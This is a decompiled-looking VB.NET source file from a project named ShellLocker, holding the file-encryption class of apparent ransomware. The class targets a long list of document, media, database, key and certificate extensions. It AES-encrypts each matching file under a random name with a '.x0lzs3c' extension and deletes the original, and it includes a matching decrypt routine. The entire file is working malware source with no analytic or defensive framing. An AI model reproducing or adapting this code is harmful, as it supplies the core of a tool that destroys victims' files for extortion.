﻿Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Text
Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices
Imports ShellLocker.AES
Public Class CryptFile
    <DebuggerNonUserCode()>
    Public Sub New()
    End Sub

    Public Shared Function decryptFile(orgFile As String, aesKey As Byte()) As Boolean
        Dim result As Boolean
        Try
            Dim str As String = New FileInfo(orgFile).DirectoryName + "\"
            Dim extension As String = New FileInfo(orgFile).Extension
            Dim text As String = New FileInfo(orgFile).Name.Split(New Char() {"."})(0)
            Dim flag As Boolean = Operators.CompareString(extension, ".x0lzs3c", False) <> 0
            If flag Then
                result = False
                Return result
            End If
            Dim array As Byte() = File.ReadAllBytes(orgFile)
            array = AES.AES.decrypt(array, aesKey)
            Dim array2 As Byte() = New Byte(256 - 1) {}
            array.ConstrainedCopy(array, array.Length - 256, array2, 0, 256)
            Dim text2 As String = Encoding.UTF8.GetString(array2)
            text2 = text2.TrimEnd(New Char() {vbNullChar})
            array.Resize(Of Byte)(array, array.Length - 256)
            File.WriteAllBytes(str + text2, array)
            File.Delete(orgFile)
            result = True
            Return result
        Catch expr_EE As Exception
            ProjectData.SetProjectError(expr_EE)
            ProjectData.ClearProjectError()
        End Try
        result = False
        Return result
    End Function

    Public Shared Function encryptFile(orgFile As String, aesKey As Byte()) As Boolean
        Dim result As Boolean
        Try
            Dim text As String = ".txt .text .cur .contact .ani .xls .lng .com .ion .url .ppt .src .cmd .exe .tgz .fon .pl .lib .load .CompositeFont .png .mp3 .mkv .veg .mp4 .lnk .zip .rar .7z .jpg .sln .crdownload .msi .vb .vbs .vbt .config .settings .resx .vbproj .json .jpeg .scss .css .html .hta .ttc .ttf .eot .camproj .m4r .001 .002 .003 .004 .005 .006 .007 .008 .009 .au .aex .8be .8bf .8bi .abr .adf .apk .ai .asd .bin .bat .gif .3dm .3g2 .3gp .aaf .accdb .aep .aepx .aet .ai .aif .arw .as .as3 .asf .asp .asx .avi .bay .bmp .cdr .cer .class .cpp .contact .cr2 .crt .crw .cs .csv .dat .dll .db .dbf .dcr .der .dng .doc .docb .docm .docx .dot .dotm .dotx .dwg .dxf .dxg .efx .eps .erf .fla .flv .iso .idml .iff .ini .SFX .sik .indb .indd .indl .indt .ico .inx .jar .jnt .jnt .java .key .kdc .m3u .m3u8 .m4u .max .mdb .mdf .mef .mid .mov .mpa .mpeg .mpg .mrw .msg .nef .nrw .odb .odc .odm .odp .ods .odt .orf .p12 .p7b .p7c .pdb .pdf .pef .pem .pfx .php .plb .pmd .pot .potm .potx .ppam .ppj .pps .ppsm .ppsx .ppt .pptm .pptx .prel .prproj .ps .psd .pst .ptx .r3d .ra .raf .raw .rb .rtf .rw2 .rwl .sdf .sldm .sldx .sql .sr2 .srf .srw .svg .swf .tif .vcf .vob .wav .wb2 .wma .wmv .wpd .wps .x3f .xla .xlam .xlk .xll .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .xml .xqx"
            Dim str As String = New FileInfo(orgFile).DirectoryName + "\"
            Dim name As String = New FileInfo(orgFile).Name
            Dim text2 As String = New FileInfo(orgFile).Extension.ToLower()
            Dim flag As Boolean = Not text.Contains(text2) OrElse Operators.CompareString(text2, "", False) = 0
            If flag Then
                result = False
                Return result
            End If
            Dim array As Byte() = File.ReadAllBytes(orgFile)
            Dim bytes As Byte() = Encoding.UTF8.GetBytes(name)
            flag = (bytes.Length > 255)
            If flag Then
                result = False
                Return result
            End If
            array.Resize(Of Byte)(array, array.Length + 256)
            array.ConstrainedCopy(bytes, 0, array, array.Length - 256, bytes.Length)
            File.WriteAllBytes(str + CryptFile.getRandomFileName() + ".x0lzs3c", AES.AES.encrypt(array, aesKey))
            File.Delete(orgFile)
            Thread.Sleep(500)
            result = True
            Return result
        Catch expr_F1 As Exception
            ProjectData.SetProjectError(expr_F1)
            ProjectData.ClearProjectError()
        End Try
        result = False
        Return result
    End Function

    Public Shared Function getRandomFileName() As String
        Dim text As String = ""
        Dim text2 As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456♣◘+◄♀♥☻☺♠•7890~=!@#$%^&*()"
        Dim random As Random = New Random()
        Dim num As Integer = random.[Next](4, 10)
        While Math.Max(Interlocked.Decrement(num), num + 1) > 0
            text += Conversions.ToString(text2(random.[Next](text2.Length)))
        End While
        Return text
    End Function
End Class
